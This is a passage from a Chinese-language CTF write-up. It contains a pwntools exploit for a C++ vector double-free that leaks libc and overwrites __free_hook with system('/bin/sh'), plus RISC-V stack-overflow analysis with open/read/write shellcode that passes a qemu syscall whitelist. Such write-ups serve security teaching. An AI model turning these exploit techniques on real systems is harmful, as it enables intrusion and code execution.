free</code>的操作了。这里注意的是<code>put_name_vector</code>函数调用结束之后就是<code>name</code>的析构函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);</span><br><span class="line">std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(</span><br><span class="line">(__int64)&amp;name,</span><br><span class="line">(__int64)&amp;name);</span><br></pre></td></tr></table></figure><p>在我们覆写完毕<code>free_hook</code>之后此处是第一次调用的位置，因此我们将<code>name</code>的起始八个字节改为<code>/bin/sh</code>，覆写的<code>fd</code>指针自然变为<code>free_hook-0x8</code>。</p><p>这里需要注意的是<code>name,map</code>是两个<code>vector</code>。这里我们<code>message</code>输入的时候恰好为第四个不需要扩展。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.152.231.198&#x27;</span>, <span class="number">8082</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_order</span>(<span class="params">order</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input an order:\n&quot;</span>, order)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_level</span>(<span class="params">level</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input an level from 1-9:\n&quot;</span>, level)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your name:&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">send_level(<span class="string">&quot;l&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;n&quot;</span>)</span><br><span class="line">leave_name(<span class="string">b&quot;a&quot;</span>*<span class="number">0x70</span>) <span class="comment"># name vector 1, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]- <span class="number">0x8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># name vector 2, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name(<span class="string">b&quot;a&quot;</span>*<span class="number">0x50</span>) <span class="comment"># name vector 3, ex</span></span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)&quot;</span>)</span><br><span class="line"></span><br><span class="line">send_level(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">send_order(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">leave_name((<span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])).ljust(<span class="number">0x50</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>分析了一下<code>double free</code>的原因，是因为在<code>update level</code>的时候，第一此<code>set_level</code>会首先将<code>map</code>放到<code>vector</code>中，而第二次的时候又会执行<code>put_map_vector</code>函数，此时<code>map vector</code>需要进行扩展，而在扩展的过程中似乎会调用<code>map</code>的析构函数，将<code>map+0xe0</code>处的堆块指针释放掉，而当我们<code>quit</code>的时候又回调用一次<code>clear map vector</code>，此时又会调用<code>map</code>的析构函数，再次释放堆块指针。</p><p>从官方的<code>wp</code>来看，当使用<code>vector::push_back()</code>函数的时候，它会调用拷贝函数，这是一个浅拷贝，如果将这个资源删除，并调用<code>vector:clear()</code>函数，那么就会调用两次资源的析构函数，这就回导致<code>double free</code>。但是这个程序中只调用了<code>vectro:clear()</code>函数。这里需要注意的是<code>vector</code>在容量不足的时候会发生扩展，扩展过程中仍然是进行一个浅拷贝，并调用<code>vector</code>中对象的析构函数，来删除原<code>vector</code>中的资源。这里满足了另一个资源释放，因此存在<code>double free</code>。</p><h2 id="Favourite-Architecure-flag1"><a href="#Favourite-Architecure-flag1" class="headerlink" title="Favourite Architecure flag1"></a>Favourite Architecure flag1</h2><p><code>riscv</code>栈溢出的漏洞，但是<code>ghidra</code>反编译失败，不知道咋回事。</p><p>比赛之后这里看了<a href="https://matshao.com/2021/01/19/CTF2021-Favourite-Architecture-Challenges/">Mid Station</a>文章，找到了一个解决方法，首先我们看到<code>entry</code>函数，中首先设置了一个<code>gp</code>寄存器的值。这里的寄存器的值在整个过程中是不变的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_000101ec</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此这里我们首先<code>ctrl-a</code>选中所有的反编译的代码，然后使用<code>crtl-r</code>设置寄存器的值，将<code>gp</code>的值设置为<code>0x6f178</code>，之后回到<code>main</code>函数，这里看到就可以反汇编了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined8 <span class="title function_">UndefinedFunction_000103e6</span><span class="params">(undefined8 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack520 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack328 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack72;</span><br><span class="line">  longlong lStack64;</span><br><span class="line">  <span class="type">int</span> iStack52;</span><br><span class="line">  undefined8 uStack40;</span><br><span class="line">  undefined8 uStack24;</span><br><span class="line">  </span><br><span class="line">  uStack24 = param_1;</span><br><span class="line">  FUN_0001616e(param_1);</span><br><span class="line">  uStack40 = <span class="number">0x10400</span>;</span><br><span class="line">  FUN_000159bc(<span class="number">1</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea28,<span class="number">0</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea20,<span class="number">0</span>);</span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea18,<span class="number">0</span>);</span><br><span class="line">  FUN_0001605a(<span class="string">&quot;Input the flag: &quot;</span>);</span><br><span class="line">  read(auStack328);</span><br><span class="line">  uVar1 = <span class="built_in">strlen</span>(auStack328);</span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">    lStack64 = FUN_00020386(auStack328 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack520,<span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack520,auStack328,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = FUN_00020e2a(auStack328,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack72 = <span class="built_in">strlen</span>(lStack64);</span><br><span class="line">      iStack52 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack72 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack52) &#123;</span><br><span class="line">          FUN_00016bc8(<span class="string">&quot;You are right :D&quot;</span>);</span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack52 * <span class="number">8</span> + lStack64,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = FUN_00020e2a(iStack52 * <span class="number">8</span> + lStack64,(longlong)(iStack52 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack52 = iStack52 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00016bc8(<span class="string">&quot;You are wrong ._.&quot;</span>);</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞存在于输入<code>flag</code>的地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00010436</span> b7 e7 <span class="number">04</span> <span class="number">00</span>     lui        a5=&gt;DAT_0004e000,<span class="number">0x4e</span>               = FFh</span><br><span class="line"><span class="number">0001043</span>a <span class="number">13</span> <span class="number">85</span> <span class="number">07</span> <span class="number">89</span>     addi       a0=&gt;s_Input_the_flag:_0004d890,a5,<span class="number">-0x770</span> = <span class="string">&quot;Input the flag: &quot;</span></span><br><span class="line"><span class="number">0001043</span>e ef <span class="number">50</span> d0 <span class="number">41</span>     jal        ra,FUN_0001605a    <span class="comment">//output()</span></span><br><span class="line"><span class="number">00010442</span> <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span>   <span class="comment">//&lt;&lt; input_falg str </span></span><br><span class="line"><span class="number">00010446</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010448</span> ef <span class="number">60</span> <span class="number">20</span> <span class="number">61</span>     jal        ra,read             <span class="comment">//read()</span></span><br><span class="line"><span class="number">0001044</span>c <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed     addi       a5,s0,<span class="number">-0x128</span></span><br><span class="line"><span class="number">00010450</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">00010452</span> ef <span class="number">00</span> <span class="number">21</span> <span class="number">09</span>     jal        ra,<span class="built_in">strlen</span>           <span class="comment">//strlen()</span></span><br><span class="line"><span class="number">00010456</span> aa <span class="number">86</span>           c.mv       a3,a0</span><br><span class="line"><span class="number">00010458</span> <span class="number">03</span> a7 <span class="number">01</span> <span class="number">86</span>     lw         a4,<span class="number">-0x7a0</span>(gp)</span><br><span class="line"><span class="number">0001045</span>c <span class="number">83</span> a7 <span class="number">41</span> <span class="number">86</span>     lw         a5,<span class="number">-0x79c</span>(gp)</span><br><span class="line"><span class="number">00010460</span> b9 <span class="number">9f</span>           c.addw     a5,a4</span><br><span class="line"><span class="number">00010462</span> <span class="number">81</span> <span class="number">27</span>           c.addiw    a5,<span class="number">0x0</span></span><br><span class="line"><span class="number">00010464</span> <span class="number">82</span> <span class="number">17</span>           c.slli     a5,<span class="number">0x20</span></span><br><span class="line"><span class="number">00010466</span> <span class="number">81</span> <span class="number">93</span>           c.srli     a5,<span class="number">0x20</span></span><br><span class="line"><span class="number">00010468</span> <span class="number">63</span> <span class="number">94</span> f6 <span class="number">10</span>     bne        a3,a5,LAB_00010570  <span class="comment">//不等于0x59就跳转</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">LAB_00010570                                    XREF[<span class="number">1</span>]:     <span class="number">00010468</span>(j)  </span><br><span class="line"><span class="number">00010570</span> <span class="number">01</span> <span class="number">00</span>           c.nop</span><br><span class="line"><span class="number">00010572</span> <span class="number">21</span> a0           c.j        LAB_0001057a</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">LAB_0001057a                                    XREF[<span class="number">2</span>]:     <span class="number">00010572</span>(j), <span class="number">00010576</span>(j)  </span><br><span class="line"><span class="number">0001057</span>a b7 e7 <span class="number">04</span> <span class="number">00</span>     lui        a5=&gt;DAT_0004e000,<span class="number">0x4e</span>                            = FFh</span><br><span class="line"><span class="number">0001057</span>e <span class="number">13</span> <span class="number">85</span> <span class="number">87</span> <span class="number">8f</span>     addi       a0=&gt;s_You_are_wrong_._._0004d8f8,a5,<span class="number">-0x70</span>= <span class="string">&quot;You are wrong ._.&quot;</span></span><br><span class="line"><span class="number">00010582</span> ef <span class="number">60</span> <span class="number">60</span> <span class="number">64</span>     jal        ra,FUN_00016bc8              <span class="comment">//output()</span></span><br><span class="line"><span class="number">00010586</span> <span class="number">85</span> <span class="number">47</span>           c.li       a5,<span class="number">0x1</span></span><br><span class="line">LAB_00010588                                    XREF[<span class="number">1</span>]:     <span class="number">0001056</span>e(j)  </span><br><span class="line"><span class="number">00010588</span> <span class="number">3</span>e <span class="number">85</span>           c.mv       a0,a5</span><br><span class="line"><span class="number">0001058</span>a fe <span class="number">70</span>           c.ldsp     ra,<span class="number">0x1f8</span>(sp)</span><br><span class="line"><span class="number">0001058</span>c <span class="number">5</span>e <span class="number">74</span>           c.ldsp     s0,<span class="number">0x1f0</span>(sp)</span><br><span class="line"><span class="number">0001058</span>e <span class="number">13</span> <span class="number">01</span> <span class="number">01</span> <span class="number">20</span>     addi       sp,sp,<span class="number">0x200</span></span><br><span class="line"><span class="number">00010592</span> <span class="number">82</span> <span class="number">80</span>           ret</span><br></pre></td></tr></table></figure><p>从第一层的逻辑看来，首先是<code>read</code>了一个很长的字符串（注意到这里的函数不一定是<code>read</code>功能类似）。但是分配的长度才是<code>0x128</code>字节大小，因此这里可以溢出。并且如果我们输入的长度不为<code>0x59</code>那么直接会跳转到错误输出的位置之后结束进程，在结束进程的时候读取了<code>sp+0x1f8</code>的位置的值作为返回地址，因此我们可以直接溢出到返回地址。那么接下来就是如何利用的问题。</p><p>注意到题目给出的<code>patch</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/linux-user/syscall.c b/linux-user/syscall.c</span><br><span class="line">index <span class="number">27</span>adee9.<span class="number">.2</span>d75464 <span class="number">100644</span></span><br><span class="line">--- a/linux-user/syscall.c</span><br><span class="line">+++ b/linux-user/syscall.c</span><br><span class="line">@@ <span class="number">-13101</span>,<span class="number">8</span> +<span class="number">13101</span>,<span class="number">31</span> @@ abi_long <span class="title function_">do_syscall</span><span class="params">(<span class="type">void</span> *cpu_env, <span class="type">int</span> num, abi_long arg1,</span></span><br><span class="line"><span class="params">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span></span><br><span class="line"><span class="params">     &#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">-    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span><br><span class="line"><span class="params">-                      arg5, arg6, arg7, arg8);</span></span><br><span class="line"><span class="params">+    <span class="keyword">switch</span> (num) &#123;</span></span><br><span class="line"><span class="params">+        <span class="comment">// syscall whitelist</span></span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_brk:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_uname:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readlinkat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_faccessat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat2:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_openat:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_read:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_readv:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_write:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_writev:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mmap:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_munmap:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_exit:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_exit_group:</span></span><br><span class="line"><span class="params">+        <span class="keyword">case</span> TARGET_NR_mprotect:</span></span><br><span class="line"><span class="params">+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span></span><br><span class="line"><span class="params">+                    arg5, arg6, arg7, arg8);</span></span><br><span class="line"><span class="params">+            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="params">+        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="params">+            <span class="built_in">printf</span>(<span class="string">&quot;[!] %d bad system call\n&quot;</span>, num);</span></span><br><span class="line"><span class="params">+            ret = <span class="number">-1</span>;</span></span><br><span class="line"><span class="params">+            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="params">+    &#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">     <span class="keyword">if</span> (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span></span><br><span class="line"><span class="params">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span></span><br></pre></td></tr></table></figure><p>我们看到其只允许调用特定的系统调用，也就是我们只能编写<code>orw shellcode</code>，而程序没有开启<code>pie</code>，也就是栈地址固定不变（需要注意的是本地栈地址和远程不一样，因此需要添加滑板指令，坑死了）。</p><p><code>shellcode</code>的编写参考<a href="https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">这里</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">4</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">4</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_openat</span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># read</span></span><br><span class="line">    c.mv a2,a7</span><br><span class="line">    addi a7,a7,<span class="number">7</span></span><br><span class="line">    ecall</span><br><span class="line">    <span class="meta"># write</span></span><br><span class="line">    li a0, <span class="number">1</span></span><br><span class="line">    addi a7,a7,<span class="number">1</span></span><br><span class="line">    ecall</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10078</span>:    <span class="number">676175b</span>7              lui    a1,<span class="number">0x67617</span></span><br><span class="line"><span class="number">1007</span>c:    c665859b              addiw    a1,a1,<span class="number">-922</span></span><br><span class="line"><span class="number">10080</span>:    <span class="number">00b</span>13223              sd    a1,<span class="number">4</span>(sp)</span><br><span class="line"><span class="number">10084</span>:    <span class="number">004</span>c                  addi    a1,sp,<span class="number">4</span></span><br><span class="line"><span class="number">10086</span>:    f9c00513              li    a0,<span class="number">-100</span></span><br><span class="line"><span class="number">1008</span>a:    <span class="number">4601</span>                  li    a2,<span class="number">0</span></span><br><span class="line"><span class="number">1008</span>c:    <span class="number">03800893</span>              li    a7,<span class="number">56</span></span><br><span class="line"><span class="number">10090</span>:    <span class="number">00000073</span>              ecall</span><br><span class="line"><span class="number">10094</span>:    <span class="number">8646</span>                  mv    a2,a7</span><br><span class="line"><span class="number">10096</span>:    <span class="number">089</span>d                  addi    a7,a7,<span class="number">7</span></span><br><span class="line"><span class="number">10098</span>:    <span class="number">00000073</span>              ecall</span><br><span class="line"><span class="number">1009</span>c:    <span class="number">4505</span>                  li    a0,<span class="number">1</span></span><br><span class="line"><span class="number">1009</span>e:    <span class="number">0885</span>                  addi    a7,a7,<span class="number">1</span></span><br><span class="line"><span class="number">100</span>a0:    <span class="number">00000073</span>              ecall</span><br></pre></td></tr></table></figure><p>这里一开始我没有编译环境，因此这里的文件名的输入特别烦人。安装编译环境之后即可以进行编译直接获取<code>shellcode</code>的字节信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-unknown-elf-as orw_flag.<span class="keyword">asm</span> -o orw_flag</span><br><span class="line"># riscv64-unknown-elf-objcopy -S -O binary -j .text orw_flag orw_flag.bin</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">8</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">8</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_open</span><br><span class="line"></span><br><span class="line">    ecall</span><br><span class="line">    c.mv a2,a7</span><br><span class="line">    addi a7,a7,<span class="number">7</span></span><br><span 